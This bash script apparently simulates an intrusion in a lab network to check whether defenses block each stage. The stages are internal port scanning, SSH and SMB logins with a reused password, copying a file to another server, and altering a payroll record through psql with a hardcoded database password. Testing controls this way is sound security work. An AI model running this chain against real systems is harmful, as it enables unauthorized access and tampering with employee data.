#!/bin/bash
# Attacker script - runs INSIDE the workstation (ws). Assumes the attacker owns ws and
# has a reused password (it / Summer2024). Each stage prints SUCCEEDED or BLOCKED.
P='Summer2024'
SSHO="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o LogLevel=ERROR"
ip_of(){ getent hosts "$1" | awk '{print $1}'; }
WEB=$(ip_of web)
ok=0; n=0
stage(){ n=$((n+1)); if [ "$1" = 0 ]; then echo "[!] $2 -> SUCCEEDED"; ok=$((ok+1)); else echo "[x] $2 -> BLOCKED"; fi; echo; }

echo "=== Flatland attack run $(date -Is) from $(hostname) ($(hostname -I | xargs)) ==="; echo

echo "--- A1 Port scan / service discovery (T1046, T1018)"
scan=$(nmap -Pn -sT -n -T4 --max-retries 1 --host-timeout 40s \
        -p 22,80,139,443,445,5432,8080 web app db files admin -oG - 2>/dev/null)
exposed=0
while read -r line; do
  ip=$(awk '{print $2}' <<<"$line")
  for p in $(grep -oE '[0-9]+/open' <<<"$line" | cut -d/ -f1); do
    if [ "$ip" = "$WEB" ] && [ "$p" = 443 ]; then echo "    $ip:$p open (public web - expected)"; continue; fi
    echo "    $ip:$p OPEN"; exposed=$((exposed+1))
  done
done < <(grep 'Ports:' <<<"$scan")
echo "    internal services exposed to workstation: $exposed"
[ "$exposed" -gt 0 ]; stage $? "A1 scan finds internal services"

echo "--- A2 SSH login to database host (T1021.004)"
out=$(timeout 15 sshpass -p "$P" ssh $SSHO it@db 'hostname; id' 2>&1); rc=$?; echo "$out" | sed 's/^/    /'
stage $rc "A2 SSH into db"

echo "--- A3 SMB connection to file server (T1021.002)"
out=$(timeout 15 smbclient //files/share -U "it%$P" -c 'ls' 2>&1); rc=$?; echo "$out" | tail -3 | sed 's/^/    /'
stage $rc "A3 SMB session to files"

echo "--- A4 Lateral tool transfer: copy file to app server (T1570)"
echo 'echo pwned from ws' > /tmp/tool.sh
out=$(timeout 15 sshpass -p "$P" scp $SSHO /tmp/tool.sh it@app:/tmp/tool.sh 2>&1 \
      && timeout 15 sshpass -p "$P" ssh $SSHO it@app 'ls -l /tmp/tool.sh' 2>&1); rc=$?; echo "$out" | sed 's/^/    /'
stage $rc "A4 file copied to app"

echo "--- A5 Unauthorised change to employee record (T1565.001 Stored Data Manipulation)"
# The attacker reuses the app's database password found on the workstation and
# edits one payroll record. The operator chooses the target, column and value:
#   TARGET_ID  (default 3)         which employee row
#   TAMPER_COL (default salary)    name | dept | role | salary
#   TAMPER_VAL (default 999999)    the new value to write
TARGET_ID="${TARGET_ID:-3}"; TAMPER_COL="${TAMPER_COL:-salary}"; TAMPER_VAL="${TAMPER_VAL:-999999}"
case "$TAMPER_COL" in
  name|dept|role) set_expr="$TAMPER_COL = '$TAMPER_VAL'";;
  salary)         set_expr="salary = $TAMPER_VAL";;
  *) echo "    unknown column '$TAMPER_COL' (use name|dept|role|salary) - defaulting to salary"
     TAMPER_COL=salary; set_expr="salary = $TAMPER_VAL";;
esac
run_sql(){ PGCONNECT_TIMEOUT=5 PGPASSWORD=AppDb2024 psql -h db -U appuser -d corp -tA -c "$1" 2>&1; }
before=$(run_sql "select name,$TAMPER_COL from employees where id=$TARGET_ID")
out=$(run_sql "UPDATE employees SET $set_expr WHERE id = $TARGET_ID"); rc=$?
after=$(run_sql "select name,$TAMPER_COL from employees where id=$TARGET_ID")
echo "    target id=$TARGET_ID  column=$TAMPER_COL"
echo "    before: $(tr '|' ' ' <<<"$before")   ->   after: $(tr '|' ' ' <<<"$after")"
echo "    $out"
[ $rc -eq 0 ] && grep -q "UPDATE 1" <<<"$out"; stage $? "A5 db record modified ($TAMPER_COL of id $TARGET_ID)"

echo "=== RESULT: $ok/$n attack stages succeeded ==="
